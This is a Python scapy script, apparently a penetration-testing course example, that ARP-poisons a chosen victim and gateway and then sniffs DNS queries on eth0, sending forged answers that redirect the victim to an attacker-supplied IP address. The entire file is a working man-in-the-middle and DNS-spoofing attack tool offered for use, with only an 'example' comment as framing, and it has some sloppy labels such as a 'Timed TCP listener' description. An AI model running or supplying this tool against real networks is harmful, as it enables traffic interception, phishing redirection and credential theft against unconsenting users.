#!/usr/bin/python

#DNS and ARP poisoning example
#Inspired by Pentester Academy example

from sys import argv
from scapy.all import *
import argparse

def dnspoison(p):

    #Is the packet a DNS query
    if p.haslayer(DNS) and p.getlayer(DNS).qr == 0:
            print(p.summary())
            ip = p.getlayer(IP)
            #udp = UDP()
            dns = p.getlayer(DNS)
            ip.src = p[IP].src
            ip.dst = p[IP].dst
            ip.sport = p[UDP].sport
            ip.dport = p[UDP].dport
            queryname = dns.qd.qname
            resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id, qr=1, qd=dns.qd,an=DNSRR(rrname=queryname, ttl=10, rdata=args.redirip))
            print("QueryName: " + queryname)
            print(resp.summary())
            send(resp)   

if __name__ == "__main__":
    #Parse command line arguments
    parser = argparse.ArgumentParser(description="Timed TCP listener")
    parser.add_argument('-v', '--victimip', dest='vip', required=True, help="Victim IP")
    parser.add_argument('--vmac', dest='vmac', required=False, default="aa:bb:cc:dd:ee:ff", help="Victim MAC")
    parser.add_argument('-g', '--gatewayip', dest='gip', required=True, help="Victim IP")
    parser.add_argument('--gmac', dest='gmac', required=False, default="11:22:33:44:55:66", help="Gateway MAC")
    parser.add_argument('-r', '--redirect', dest='redirip', required=True, help="Redirect IP")
    parser.add_argument('-c', '--count', dest='respcount', type=int, required=False, default=10, help="Maximum Responses")
    args = parser.parse_args()

    #Build ARP poison for the victim
    varp = ARP()
    varp.op = 2
    varp.psrc = args.gip
    varp.pdst = args.vip
    varp.hwdst = args.vmac

    #Build ARP poison for the gateway
    garp = ARP()
    garp.op = 2
    garp.psrc = args.vip
    garp.pdst = args.gip
    garp.hwdst = args.gmac

    #Perform "single shot" ARP poisoning
    #This could be updated as a seperate thread to be sustained and more effective
    print("ARP poisoning...")
    send(varp, count=1000)
    send(garp, count=1000)

    #Listen for DNS and send responses
    i = 0
    print("Listening for DNS Packets..")
    print("Redirecting to: " + args.redirip)
    while i<int(args.respcount) :
        print("%d / %d\n"%(i,args.respcount))
        sniff(iface="eth0",count=1,filter="udp port 53",prn=dnspoison)
        i += 1
